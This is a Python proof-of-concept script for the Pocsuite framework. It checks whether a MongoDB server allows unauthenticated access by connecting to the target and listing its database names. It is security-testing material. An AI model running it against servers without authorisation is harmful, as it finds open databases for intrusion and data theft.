#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
reload(sys)
sys.setdefaultencoding('utf8')
import pymongo
from pocsuite.api.poc import POCBase, Output
from pocsuite.api.poc import register


class TestPOC(POCBase):
    name = 'MongoDB未授权访问'
    vulID = '78176'  # https://www.seebug.org/vuldb/ssvid-78176
    author = ['zeal']
    vulType = 'Unauthorized'
    version = '1.0'    # default version: 1.0
    references = ['http://www.s3cur1ty.de/m1adv2013-003']
    desc = '无需授权任意访问MongoDB服务'

    vulDate = '2013-02-14'
    createDate = '2013-02-14'
    updateDate = '2013-02-14'

    appName = 'MongoDB'
    appVersion = 'All'
    appPowerLink = ''
    samples = ['']
    defaultPorts = [27017]
    defaultService = ['mongo', 'mongodb']

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result = {}
        try:
            target_ip = self.target.split(':')[0].strip('/')
            if len(self.target.split(':')) > 1:
                target_port = int(self.target.split(':')[1].strip('/'))
            else:
                target_port = 27017
            connection = pymongo.MongoClient(target_ip, target_port, socketTimeoutMS=3000)
            dbs = connection.database_names()
            if dbs:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = '%s:%i存在MongoDB未授权' % (target_ip, target_port)
        except Exception as e:
            print e
            result = {}

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('失败')
        return output


register(TestPOC)
